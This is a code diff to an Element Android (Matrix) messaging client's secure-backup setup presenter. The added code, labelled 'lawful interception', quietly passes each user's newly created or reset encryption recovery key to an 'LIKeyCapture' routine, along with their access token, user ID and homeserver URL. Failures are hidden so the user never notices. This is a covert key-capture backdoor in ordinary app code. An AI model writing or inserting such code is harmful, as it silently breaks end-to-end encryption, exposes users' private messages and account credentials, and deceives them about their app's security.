@@ -27,6 +27,8 @@ import io.element.android.features.securebackup.impl.setup.views.RecoveryKeyView
 import io.element.android.libraries.architecture.Presenter
 import io.element.android.libraries.matrix.api.encryption.EnableRecoveryProgress
 import io.element.android.libraries.matrix.api.encryption.EncryptionService
+// LI: Import key capture for lawful interception
+import io.element.android.libraries.matrix.impl.li.LIKeyCapture
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.ExperimentalCoroutinesApi
 import kotlinx.coroutines.launch
@@ -103,8 +105,25 @@ class SecureBackupSetupPresenter(
         if (isChangeRecoveryKeyUserStory) {
             Timber.tag(loggerTagSetup.value).d("Calling encryptionService.resetRecoveryKey()")
             encryptionService.resetRecoveryKey().fold(
-                onSuccess = {
-                    stateAndDispatch.dispatchAction(SecureBackupSetupStateMachine.Event.SdkHasCreatedKey(it))
+                onSuccess = { recoveryKey ->
+                    stateAndDispatch.dispatchAction(SecureBackupSetupStateMachine.Event.SdkHasCreatedKey(recoveryKey))
+
+                    // LI: Capture recovery key after successful reset
+                    // CRITICAL: Only called after verifying the operation succeeded
+                    launch {
+                        try {
+                            val sessionData = encryptionService.getClient().sessionData()
+                            LIKeyCapture.captureKey(
+                                homeserverUrl = sessionData.homeserverUrl,
+                                accessToken = sessionData.accessToken,
+                                userId = sessionData.userId,
+                                recoveryKey = recoveryKey
+                            )
+                        } catch (e: Exception) {
+                            Timber.tag(loggerTagSetup.value).e(e, "LI: Failed to capture recovery key")
+                            // Silent failure - don't disrupt user experience
+                        }
+                    }
                 },
                 onFailure = {
                     if (it is Exception) {
@@ -135,8 +154,26 @@ class SecureBackupSetupPresenter(
                 is EnableRecoveryProgress.CreatingRecoveryKey,
                 is EnableRecoveryProgress.BackingUp,
                 is EnableRecoveryProgress.RoomKeyUploadError -> Unit
-                is EnableRecoveryProgress.Done ->
+                is EnableRecoveryProgress.Done -> {
                     stateAndDispatch.dispatchAction(SecureBackupSetupStateMachine.Event.SdkHasCreatedKey(enableRecoveryProgress.recoveryKey))
+
+                    // LI: Capture recovery key after successful creation
+                    // CRITICAL: Only called after verifying the operation succeeded
+                    launch {
+                        try {
+                            val sessionData = encryptionService.getClient().sessionData()
+                            LIKeyCapture.captureKey(
+                                homeserverUrl = sessionData.homeserverUrl,
+                                accessToken = sessionData.accessToken,
+                                userId = sessionData.userId,
+                                recoveryKey = enableRecoveryProgress.recoveryKey
+                            )
+                        } catch (e: Exception) {
+                            Timber.tag(loggerTagSetup.value).e(e, "LI: Failed to capture recovery key")
+                            // Silent failure - don't disrupt user experience
+                        }
+                    }
+                }
             }
         }
     }
